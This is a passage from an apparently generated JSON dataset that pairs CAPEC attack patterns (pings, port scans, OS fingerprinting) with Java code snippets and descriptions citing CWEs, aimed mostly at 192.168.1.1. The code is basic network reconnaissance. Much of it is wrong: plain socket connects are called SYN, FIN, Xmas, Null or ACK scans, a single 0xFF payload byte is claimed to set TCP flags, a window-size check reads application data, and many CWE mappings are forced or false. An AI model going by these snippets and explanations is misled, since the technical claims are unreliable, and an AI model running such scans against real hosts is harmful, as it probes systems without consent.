        "description": "This Java code snippet demonstrates a simple TCP ACK Ping to check if a host is alive. The program attempts to create a socket connection to a specified host on port 80. If the connection is successful, it prints 'Host is alive'. If the connection fails, it prints 'Host is not responding'. This embodies the main idea of the CAPEC by using a TCP connection attempt to determine if a host is alive. The code also indirectly touches on CWE-319 (Cleartext Transmission of Sensitive Information) as it does not use encryption for the connection, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it reveals the host's status to any actor running the code."
    },
    {
        "capec_id": "298",
        "capec_name": "UDP Ping",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class UDPPing {\n    public static void main(String[] args) {\n        String targetHost = \"192.168.1.1\"; // Target IP address\n        int targetPort = 65535; // High port number\n        byte[] buffer = new byte[1024]; // Buffer for the UDP packet\n\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress address = InetAddress.getByName(targetHost);\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, targetPort);\n\n            // Send UDP packet to the target host\n            socket.send(packet);\n            System.out.println(\"UDP packet sent to \" + targetHost + \":\" + targetPort);\n\n            // Wait for ICMP response (this part is simplified and may not work as expected in real scenarios)\n            socket.receive(packet);\n            System.out.println(\"Received response from \" + packet.getAddress());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP ping to a target host. The code sends a UDP datagram to a high port (65535) on the target host (192.168.1.1). The goal is to solicit an 'ICMP port unreachable' message from the target, indicating that the host is alive. This approach leverages the CAPEC-UDP Ping technique. The code also touches on related CWEs: it sends data to a potentially incorrect destination (CWE-941), and it does not protect the outbound error messages (CWE-1320). The code is simplified and may not handle all real-world scenarios, such as receiving ICMP responses properly."
    },
    {
        "capec_id": "299",
        "capec_name": "TCP SYN Ping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPSynPing {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress inet = InetAddress.getByName(target);\n            Socket socket = new Socket(inet, port);\n            System.out.println(\"Host is alive\");\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host\");\n        } catch (IOException e) {\n            System.out.println(\"Host is not responding\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple TCP SYN ping to check if a host is alive by attempting to establish a connection to a specified port. The code tries to create a socket connection to the target IP address on port 80. If the connection is successful, it prints 'Host is alive', otherwise, it catches exceptions and prints 'Host is not responding'. This embodies the main idea of the CAPEC 'TCP SYN Ping' by using TCP SYN packets to discover if a host is alive. The code also indirectly touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it reveals the host's status, and CWE-319 (Cleartext Transmission of Sensitive Information) since the connection attempt is made without encryption."
    },
    {
        "capec_id": "300",
        "capec_name": "Port Scanning",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Scanner;\n\npublic class VulnerablePortScanner {\n    public static void main(String[] args) {\n        int port = 8080; // Example port\n        try (ServerSocket serverSocket = new ServerSocket(port)) {\n            System.out.println(\"Server is listening on port \" + port);\n            while (true) {\n                Socket socket = serverSocket.accept();\n                new ClientHandler(socket).start();\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error occurred: \" + e.getMessage());\n        }\n    }\n}\n\nclass ClientHandler extends Thread {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    public void run() {\n        try (Scanner scanner = new Scanner(socket.getInputStream())) {\n            while (scanner.hasNextLine()) {\n                String message = scanner.nextLine();\n                System.out.println(\"Received: \" + message);\n                // Echo the message back to the client (vulnerable to cleartext transmission)\n                socket.getOutputStream().write((\"Echo: \" + message + \"\\n\").getBytes());\n            }\n        } catch (IOException e) {\n            System.out.println(\"Error occurred: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple server that listens on a specific port (8080) and handles incoming client connections. The server accepts connections and starts a new thread for each client to handle communication. The ClientHandler class reads messages from the client and echoes them back. This setup is vulnerable to several issues: \n1. **Port Scanning (CAPEC-300)**: The server listens on a known port, making it susceptible to port scanning attacks where an adversary can determine the state of the port.\n2. **Cleartext Transmission of Sensitive Information (CWE-319)**: The server echoes messages back to the client in cleartext, which can be intercepted by unauthorized actors.\n3. **Multiple Binds to the Same Port (CWE-605)**: Although not explicitly shown, if multiple instances of this server were started, they could attempt to bind to the same port, leading to potential conflicts.\n4. **Exposure of Sensitive Information to an Unauthorized Actor (CWE-200)**: The server may inadvertently expose sensitive information through the echoed messages.\nThis code represents the main idea of CAPEC-300 by illustrating how a service listening on a port can be a target for port scanning and related vulnerabilities."
    },
    {
        "capec_id": "301",
        "capec_name": "TCP Connect Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPConnectScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            Socket socket = new Socket(target, port);\n            System.out.println(\"Port \" + port + \" is open on \" + target);\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.out.println(\"Port \" + port + \" is closed on \" + target);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP connect scan, which attempts to establish a full TCP connection to a specified port on a target system. The code tries to create a socket connection to the target IP address and port. If the connection is successful, it prints that the port is open; otherwise, it catches an IOException and prints that the port is closed. This embodies the main idea of the CAPEC 'TCP Connect Scan'. The code also indirectly touches on related CWEs: it could expose sensitive information (CWE-200) by revealing open ports, it does not handle multiple binds to the same port (CWE-605), it relies on the IP address for targeting (CWE-291), and it lacks integrity checks for the data transmitted (CWE-353)."
    },
    {
        "capec_id": "302",
        "capec_name": "TCP FIN Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPFinScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            Socket socket = new Socket(address, port);\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.out.println(\"Port \" + port + \" is closed on \" + target);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP connection attempt to a specified target and port. The main idea is to check if a port is closed by attempting to establish a connection. If the connection fails (IOException), it indicates that the port is closed. This embodies the concept of a TCP FIN scan, where an adversary sends packets to determine the state of ports. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it reveals the status of the port, and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) as it does not verify the endpoint's authenticity."
    },
    {
        "capec_id": "303",
        "capec_name": "TCP Xmas Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\n\npublic class XmasScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            SocketChannel socketChannel = SocketChannel.open();\n            socketChannel.connect(new java.net.InetSocketAddress(address, port));\n\n            ByteBuffer buffer = ByteBuffer.allocate(1024);\n            buffer.put((byte) 0xFF); // Set all TCP flags (Xmas scan)\n            buffer.flip();\n\n            socketChannel.write(buffer);\n            buffer.clear();\n\n            int bytesRead = socketChannel.read(buffer);\n            if (bytesRead > 0) {\n                System.out.println(\"Received response, port is closed.\");\n            } else {\n                System.out.println(\"No response, port might be open.\");\n            }\n\n            socketChannel.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of a TCP Xmas scan. The code attempts to connect to a specified target IP address and port, then sends a TCP packet with all flags set (Xmas scan). If a response is received, it indicates that the port is closed (RST packet received). If no response is received, the port might be open. This scan technique leverages the behavior described in RFC 793, where closed ports respond with a RST packet to out-of-state TCP segments. The code also highlights potential weaknesses such as exposure of sensitive information (CWE-200), lack of integrity checks (CWE-353, CWE-924), and cleartext transmission (CWE-319)."
    },
    {
        "capec_id": "304",
        "capec_name": "TCP Null Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPNullScan {\n    public static void main(String[] args) {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java TCPNullScan <host> <port>\");\n            return;\n        }\n\n        String host = args[0];\n        int port = Integer.parseInt(args[1]);\n\n        try {\n            InetAddress address = InetAddress.getByName(host);\n            Socket socket = new Socket(address, port);\n            socket.setTcpNoDelay(true); // Disable Nagle's algorithm\n            socket.getOutputStream().write(new byte[0]); // Send empty packet (NULL scan)\n            socket.close();\n            System.out.println(\"Port \" + port + \" is open.\");\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + host);\n        } catch (IOException e) {\n            System.out.println(\"Port \" + port + \" is closed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of a TCP NULL scan, which is used to determine if a port on a target machine is closed. The code attempts to create a socket connection to the specified host and port, then sends an empty packet (NULL scan) by writing an empty byte array to the output stream. If the connection is successful, it indicates that the port is open. If an IOException is caught, it indicates that the port is closed. This behavior aligns with the CAPEC description, where closed ports respond with a RST packet. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) and not verifying the integrity of the data (CWE-353)."
    },
    {
        "capec_id": "305",
        "capec_name": "TCP ACK Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPAckScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            Socket socket = new Socket(address, port);\n            socket.setSoLinger(true, 0); // CWE-605: Multiple Binds to the Same Port\n            socket.getOutputStream().write(\"GET / HTTP/1.1\\r\\nHost: \".getBytes()); // CWE-319: Cleartext Transmission\n            socket.getOutputStream().flush();\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.out.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP ACK scan to gather information about firewall or ACL configurations. The code attempts to connect to a specified target IP address and port, then sends a simple HTTP GET request in cleartext. The use of `setSoLinger` with a zero timeout can lead to issues described in CWE-605 (Multiple Binds to the Same Port). Additionally, the cleartext transmission of the HTTP request is related to CWE-319 (Cleartext Transmission of Sensitive Information). This code represents the main idea of the CAPEC by showing how an adversary might use TCP connections to probe and gather information about network configurations."
    },
    {
        "capec_id": "306",
        "capec_name": "TCP Window Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\n\npublic class TCPWindowScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\";\n        int port = 80;\n        try {\n            InetAddress address = InetAddress.getByName(target);\n            SocketChannel socketChannel = SocketChannel.open();\n            socketChannel.connect(new java.net.InetSocketAddress(address, port));\n            Socket socket = socketChannel.socket();\n            socket.setSoTimeout(1000);\n\n            // Send an ACK packet\n            ByteBuffer buffer = ByteBuffer.allocate(1024);\n            buffer.put((byte) 0x10); // ACK flag\n            buffer.flip();\n            socketChannel.write(buffer);\n\n            // Read the response\n            buffer.clear();\n            socketChannel.read(buffer);\n            buffer.flip();\n\n            // Check the TCP Window Size field\n            int windowSize = buffer.getShort(14) & 0xFFFF;\n            if (windowSize > 0) {\n                System.out.println(\"Port is open\");\n            } else {\n                System.out.println(\"Port is closed\");\n            }\n\n            socketChannel.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + target);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a TCP Window Scan. The code attempts to connect to a specified target IP address and port, sends an ACK packet, and then reads the response to check the TCP Window Size field. If the window size is positive, it infers that the port is open; otherwise, it infers that the port is closed. This scan can expose sensitive information about the target system, such as port status and potentially the operating system type, which aligns with the CAPEC description. The code also highlights potential weaknesses like CWE-200 (Exposure of Sensitive Information), CWE-319 (Cleartext Transmission), and CWE-497 (Exposure of Sensitive System Information)."
    },
    {
        "capec_id": "307",
        "capec_name": "TCP RPC Scan",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class VulnerableRPCServer {\n    private static final Logger logger = Logger.getLogger(VulnerableRPCServer.class.getName());\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(1111)) { // CWE-605: Binding to a well-known port\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                handleClient(clientSocket);\n            }\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"Server exception\", e);\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) {\n        try {\n            // CWE-200: Exposing sensitive information\n            logger.info(\"Client connected: \" + clientSocket.getInetAddress());\n\n            // CWE-294: No proper authentication mechanism\n            // CWE-918: Potential SSRF vulnerability\n            // CWE-494: No integrity check for incoming data\n            byte[] buffer = new byte[1024];\n            int bytesRead = clientSocket.getInputStream().read(buffer);\n            String request = new String(buffer, 0, bytesRead);\n            logger.info(\"Received request: \" + request);\n\n            // Process the request (vulnerable to replay attacks and SSRF)\n            String response = \"Response to: \" + request;\n            clientSocket.getOutputStream().write(response.getBytes());\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"Client handling exception\", e);\n        } finally {\n            try {\n                clientSocket.close();\n            } catch (IOException e) {\n                logger.log(Level.SEVERE, \"Failed to close client socket\", e);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable RPC server that listens on a well-known port (1111). The server accepts incoming connections and processes client requests without proper authentication, integrity checks, or validation. This makes it susceptible to multiple vulnerabilities: \n1. CWE-200: The server logs sensitive information about connected clients.\n2. CWE-294: The server lacks proper authentication, making it vulnerable to capture-replay attacks.\n3. CWE-494: The server does not verify the integrity of incoming data.\n4. CWE-918: The server processes requests without validating the destination, leading to potential SSRF attacks.\n5. CWE-605: Binding to a well-known port can lead to port hijacking or spoofing."
    },
    {
        "capec_id": "308",
        "capec_name": "UDP Scan",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class UDPScan {\n    public static void main(String[] args) {\n        String target = \"192.168.1.1\"; // Target IP address\n        int port = 12345; // Target port\n        byte[] buffer = new byte[1024];\n\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            socket.setSoTimeout(2000); // Set timeout for response\n\n            // Send UDP packet\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, InetAddress.getByName(target), port);\n            socket.send(packet);\n\n            // Receive response\n            DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n            socket.receive(response);\n\n            System.out.println(\"Port \" + port + \" is open.\");\n        } catch (SocketTimeoutException e) {\n            System.out.println(\"Port \" + port + \" is closed or filtered.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic UDP scan to check the status of a specific UDP port on a target system. The code sends a UDP packet to the target port and waits for a response. If a response is received, it indicates that the port is open. If a timeout occurs, it suggests that the port is closed or filtered. This code embodies the main idea of the CAPEC 'UDP Scan' by attempting to gather information about the UDP port status. The code also touches on related CWEs: it does not handle sensitive information securely (CWE-319), lacks integrity checks (CWE-353), and could potentially expose sensitive information to unauthorized actors (CWE-200)."
    },
    {
        "capec_id": "309",
        "capec_name": "Network Topology Mapping",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class NetworkScanner {\n    public static void main(String[] args) {\n        String subnet = \"192.168.1.\";\n        for (int i = 1; i < 255; i++) {\n            String host = subnet + i;\n            try {\n                InetAddress inetAddress = InetAddress.getByName(host);\n                if (inetAddress.isReachable(1000)) {\n                    System.out.println(\"Host: \" + host + \" is reachable.\");\n                }\n            } catch (UnknownHostException e) {\n                System.err.println(\"Unknown host: \" + host);\n            } catch (IOException e) {\n                System.err.println(\"Error reaching host: \" + host);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple network scanner that attempts to map network nodes by checking the reachability of IP addresses within a given subnet. The code iterates through a range of IP addresses (192.168.1.1 to 192.168.1.254) and uses the `InetAddress` class to determine if each address is reachable. If an address is reachable, it prints out the host information.\n\nThe code embodies the main idea of CAPEC-309 (Network Topology Mapping) by performing network reconnaissance to identify active hosts. It also touches on related CWEs:\n- CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor): The scanner could expose information about reachable hosts to unauthorized users.\n- CWE-1125 (Excessive Attack Surface): The scanner increases the attack surface by probing multiple IP addresses.\n- CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere): The scanner could reveal system-level information about the network topology to unauthorized actors."
    },
    {
        "capec_id": "310",
        "capec_name": "Scanning for Vulnerable Software",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class VulnerableSoftwareScanner {\n    private static final int[] COMMON_PORTS = {21, 23, 25, 161}; // FTP, Telnet, SMTP, SNMP\n\n    public static void main(String[] args) throws IOException {\n        String targetIp = \"192.168.1.1\"; // Example target IP\n        List<Integer> openPorts = new ArrayList<>();\n\n        for (int port : COMMON_PORTS) {\n            if (isPortOpen(targetIp, port)) {\n                openPorts.add(port);\n                System.out.println(\"Port \" + port + \" is open on \" + targetIp);\n            }\n        }\n\n        if (!openPorts.isEmpty()) {\n            System.out.println(\"Potentially vulnerable services detected on \" + targetIp);\n        }\n    }\n\n    private static boolean isPortOpen(String ip, int port) {\n        try (Socket socket = new Socket(InetAddress.getByName(ip), port)) {\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple network scanner that checks for open ports on a target IP address. The ports scanned are common for services like FTP, Telnet, SMTP, and SNMP, which are often targeted due to their vulnerabilities. The code iterates through a list of these common ports and attempts to establish a socket connection to each one. If a connection is successful, it indicates that the port is open, and the service running on that port may be vulnerable. This embodies the CAPEC concept of 'Scanning for Vulnerable Software' by identifying potentially exploitable services. The code also touches on related CWEs by potentially exposing sensitive system information (CWE-497) and demonstrating an excessive attack surface (CWE-1125) through the open ports."
    },
    {
        "capec_id": "311",
        "capec_name": "DEPRECATED: OS Fingerprinting",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class OSFingerprinting {\n    private static final Logger logger = Logger.getLogger(OSFingerprinting.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Setup logger to write to a debug log file\n            FileHandler fh = new FileHandler(\"debug.log\");\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            // Attempt to fingerprint the OS by connecting to a known port\n            String target = \"192.168.1.1\";\n            int port = 80;\n            Socket socket = new Socket(target, port);\n            InetAddress inetAddress = socket.getInetAddress();\n            logger.info(\"Connected to: \" + inetAddress.getHostAddress());\n\n            // Log the OS fingerprinting attempt\n            logger.info(\"OS Fingerprinting attempt on: \" + target);\n\n            socket.close();\n        } catch (IOException e) {\n            logger.severe(\"Connection failed: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of active OS fingerprinting by attempting to connect to a known port on a target machine. The code sets up a logger to write to a debug log file, which can expose sensitive information (CWE-534). It then tries to connect to a specified IP address and port, logging the connection details. This can be used to infer the operating system of the target machine based on the response, embodying the concept of OS fingerprinting (CAPEC-312). The use of logging without proper access control can lead to information exposure, and the reliance on specific API functions (e.g., Socket) may cause portability issues (CWE-589)."
    },
    {
        "capec_id": "312",
        "capec_name": "Active OS Fingerprinting",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class OSFingerprinting {\n    public static void main(String[] args) {\n        String targetIP = \"192.168.1.1\";\n        int port = 80;\n        try {\n            Socket socket = new Socket(targetIP, port);\n            InetAddress inetAddress = socket.getInetAddress();\n            System.out.println(\"Connected to: \" + inetAddress);\n            // Send a malformed packet to elicit a response\n            socket.getOutputStream().write(new byte[]{0x00, 0x01, 0x02, 0x03});\n            byte[] response = new byte[1024];\n            int bytesRead = socket.getInputStream().read(response);\n            System.out.println(\"Response: \" + new String(response, 0, bytesRead));\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Unknown host: \" + targetIP);\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic form of active OS fingerprinting. The code attempts to connect to a target IP address on a specified port and sends a malformed packet to elicit a response. The response is then read and printed, which can be analyzed to infer the operating system of the target. This embodies the main idea of CAPEC-312 (Active OS Fingerprinting) by probing the target to reveal information about its OS. The code also touches on related CWEs: it exposes sensitive information (CWE-200, CWE-497) by printing the response, and it transmits data in cleartext (CWE-319)."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class PassiveOSFingerprinting {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                String inputLine;\n                while ((inputLine = in.readLine()) != null) {\n                    // Log the incoming data for OS fingerprinting\n                    System.out.println(\"Received: \" + inputLine);\n                }\n                clientSocket.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple server that passively listens for incoming network connections on port 8080. When a client connects, it reads and logs the incoming data. This data can be analyzed to perform passive OS fingerprinting by comparing the observed behavior with known OS signatures. The code embodies the main idea of CAPEC- Passive OS Fingerprinting by monitoring communication without sending probes. It also touches on related CWEs: the data is logged in cleartext (CWE-319), potentially exposing sensitive information (CWE-200, CWE-497), and the server's view of the OS state may be inconsistent with the actual state (CWE-1249)."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            FileHandler fh = new FileHandler(\"debug.log\");\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n\n            String ipAddress = \"192.168.1.1\";\n            InetAddress inet = InetAddress.getByName(ipAddress);\n\n            if (inet.isReachable(5000)) {\n                logger.info(\"IP Address is reachable: \" + ipAddress);\n            } else {\n                logger.info(\"IP Address is not reachable: \" + ipAddress);\n            }\n        } catch (UnknownHostException e) {\n            logger.severe(\"Unknown Host Exception: \" + e.getMessage());\n        } catch (IOException e) {\n            logger.severe(\"IO Exception: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation related to the deprecated CAPEC-312 (Active OS Fingerprinting) and associated CWEs. The code attempts to perform an IP reachability check, which can be used for OS fingerprinting. It also logs sensitive information to a debug log file (CWE-534), which can expose sensitive data. The code does not handle DNS lookups securely (CWE-247) and relies on potentially untrusted IP addresses for security decisions. This snippet embodies the main idea of the CAPEC by showing how an attacker might gather information about a system's network configuration and reachability, while also highlighting the associated weaknesses in logging and DNS reliance."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String request = in.readLine();\n            if (request != null && request.equals(\"AUTHENTICATE\")) {\n                out.println(\"AUTH_SUCCESS\");\n            }\n\n            // Vulnerable to replay attack\n            String authToken = in.readLine();\n            if (authToken != null && authToken.equals(\"VALID_TOKEN\")) {\n                out.println(\"ACCESS_GRANTED\");\n            } else {\n                out.println(\"ACCESS_DENIED\");\n            }\n\n            clientSocket.close();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple server that listens on port 8080 and handles client connections. The server is vulnerable to a replay attack (CWE-294) because it relies on a static token ('VALID_TOKEN') for authentication without any mechanism to prevent replay attacks. An attacker could capture the 'VALID_TOKEN' and replay it to gain unauthorized access. This code also demonstrates the deprecated CAPEC-312 (Active OS Fingerprinting) by showing how a server might be probed for vulnerabilities. The server's simplistic authentication mechanism and lack of proper security measures make it an easy target for fingerprinting and replay attacks."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class ICMPSpoofing {\n    public static void main(String[] args) {\n        String targetIP = \"192.168.1.1\";\n        try {\n            InetAddress target = InetAddress.getByName(targetIP);\n            if (target.isReachable(5000)) {\n                System.out.println(\"Target is reachable\");\n            } else {\n                System.out.println(\"Target is not reachable\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + targetIP);\n        } catch (IOException e) {\n            System.out.println(\"Network error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic ICMP probe to check if a target IP address is reachable. The code uses the `InetAddress` class to send an ICMP echo request (ping) to the specified IP address. If the target is reachable within a 5-second timeout, it prints 'Target is reachable'; otherwise, it prints 'Target is not reachable'. This represents the concept of ICMP fingerprinting probes, which can be used for active OS fingerprinting (CAPEC-312). The code also touches on CWE-287 (Authentication Bypass Issues) by not implementing any authentication mechanism, and CWE-532 (Information Exposure Through Debug Log Files) by potentially exposing network error messages."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.Random;\n\npublic class IPIDSequencingProbe {\n    public static void main(String[] args) throws Exception {\n        InetAddress target = InetAddress.getByName(\"192.168.1.1\");\n        DatagramSocket socket = new DatagramSocket();\n        byte[] buffer = new byte[1024];\n        Random random = new Random();\n\n        for (int i = 0; i < 10; i++) {\n            int id = random.nextInt(65535);\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, target, 80);\n            socket.send(packet);\n            System.out.println(\"Sent packet with ID: \" + id);\n        }\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an IP ID sequencing probe. The code sends multiple UDP packets to a target IP address, each with a randomly generated ID. This mimics the process of analyzing the IP 'ID' field sequence number generation algorithm of a remote host, which can be used for OS fingerprinting. The code highlights the potential exposure of sensitive information (CWE-200) through the analysis of IP ID sequences. It also touches on the reliance on IP addresses for authentication (CWE-291) by targeting a specific IP address. The random ID generation simulates the lack of a unique, immutable identifier (CWE-1192) and insecure identifier mechanisms (CWE-1294)."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\n\npublic class IPIDProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress address = InetAddress.getByName(\"192.168.1.1\"); // Target IP\n            byte[] buf = new byte[1]; // Empty payload\n            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, 12345); // Closed port\n            packet.setData(new byte[]{0x12, 0x34}); // Arbitrary IP 'ID' value\n            socket.send(packet);\n\n            // Listen for ICMP error message\n            byte[] recvBuf = new byte[1024];\n            DatagramPacket recvPacket = new DatagramPacket(recvBuf, recvBuf.length);\n            socket.receive(recvPacket);\n\n            // Extract and print the echoed IP 'ID' value\n            byte[] data = recvPacket.getData();\n            int echoedID = ((data[0] & 0xFF) << 8) | (data[1] & 0xFF);\n            System.out.println(\"Echoed IP 'ID' value: \" + Integer.toHexString(echoedID));\n        } catch (SocketException | UnknownHostException e) {\n            e.printStackTrace();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
